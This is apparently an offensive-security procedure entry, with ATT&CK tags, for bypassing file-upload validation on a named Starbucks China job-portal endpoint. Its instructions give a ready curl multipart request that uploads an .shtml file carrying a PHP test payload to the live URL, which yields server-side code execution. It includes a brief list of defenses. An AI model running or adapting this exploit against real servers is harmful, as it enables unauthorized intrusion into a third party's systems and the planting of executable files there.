---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - file-upload
  - bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/upload-malicious-shtml-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.463Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Craft-Malicious-File-Upload-Request

## Summary

This procedure exploits insufficient file validation by crafting a POST request to upload a malicious SHTML file containing executable code, bypassing extension checks in the Starbucks job portal upload endpoint.

## Description

The web application on ecjobsdc.starbucks.com.cn fails to properly sanitize uploaded file extensions, allowing attackers to append .shtml to filenames and embed PHP-like code. This leads to server-side execution upon access, enabling information disclosure and potential phishing.

## Requirements

1. Identified upload endpoint from reconnaissance
2. Tool capable of sending custom HTTP POST requests (e.g., curl)
3. Malicious payload file or inline code (e.g., <?php echo 1111;?>)

## Defense

Defensive measures and detection strategies:

- Enforce strict allowlists for file extensions and MIME types
- Scan uploaded files for malicious code using antivirus
- Store uploads outside web root and serve via secure handlers

## Objectives

1. Successfully upload arbitrary web-executable file
2. Obtain temporary access path for the uploaded file
3. Confirm no rejection due to extension

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Create a simple executable payload to test code execution.

Use content like <?php echo 1111;?> in an SHTML file.

### Step 2: Send Crafted Request

**Context**: Replicate the multipart form-data structure with modified filename.

Execute [[commands/upload-malicious-shtml-file]] to send the request:

```bash
curl -X POST http://ecjobsdc.starbucks.com.cn/recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06" \
  --data-binary $'------WebKitFormBoundaryevPInYidBxSvSd06\r\nContent-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 1111;?>\r\n------WebKitFormBoundaryevPInYidBxSvSd06--\r\n'
```

> This command crafts the boundary, sets the filename to xxx.shtml, and includes the payload. Expected output is a success response with file ID.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/upload-malicious-shtml-file]]

## Tools Used


## Tags

- [[file-upload]]
- [[bypass]]
